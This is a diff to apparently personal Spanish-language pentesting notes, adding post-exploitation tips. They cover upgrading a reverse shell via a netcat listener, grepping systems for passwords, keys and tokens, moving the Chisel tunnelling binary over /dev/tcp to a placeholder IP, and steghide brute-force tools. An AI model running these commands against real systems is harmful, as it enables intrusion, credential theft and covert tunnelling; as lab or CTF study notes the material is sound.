@@ -1,4 +1,6 @@
-# Herramientas varias
+# Varias cositas  
+
+## Herramientas varias  
 
 Asciinema - grabar consola  
 https://asciinema.org/
@@ -158,6 +160,66 @@ Hacks to search in Google Dorks
 https://pentest-tools.com/information-gathering/google-hacking  
 
 
+## Tips  
+
+### Comandos al ingresar por shell (reverse shell)  
+
+whoami  
+ifconfig o ip a  
+  
+script /dev/null -c bash  
+^Z  
+stty raw echo -echo; fg  
+nc -nlvp 443  
+reset  
+
+terminal ? xterm  
+export TERM=xterm  
+export SHELL=bash  
+
+en una ventana mia ejecutar: stty -a   
+Y ver la cantidad de filas y columnas, para configurar lo mismo en la maquina remota  
+stty rows 53 columns 206  
+
+Buscamos credenciales  
+grep -r -i -E "user|pass|key|token"  
+
+Buscamos archivos   
+find \-type f 2>/dev/null  
+
+Script en python:  
+https://pastebin.com/5GqY54FG  
+
+### Chisel  
+https://github.com/jpillora/chisel  
+
+truco para compilar a bajo peso:  
+go build -ldflags "-s -w"  
+du -hc chisel  
+upx brute chisel  
+du -hc chisel  
+
+> upx comprime binarios
+
+desde maquina local hacer:  
+nc -lnvp 443 < chisel  
+y en maquina virtual:  
+cat > chisel < /dev/tcp/ipxxx/443
+
+maquina local:  
+./chisel server --reverse -p puerto    
+
+maquina ataque:  
+./chisel client ip:puerto  
+
+
+### Steghide - Esteganografía  
+Buscar contenido en las imágenes  
+
+http://steghide.sourceforge.net/  
+https://fwhibbit.es/steghide-brute-force-tool  
+https://github.com/Va5c0/Steghide-Brute-Force-Tool  
+https://github.com/Paradoxis/StegCracker  
 
 
 
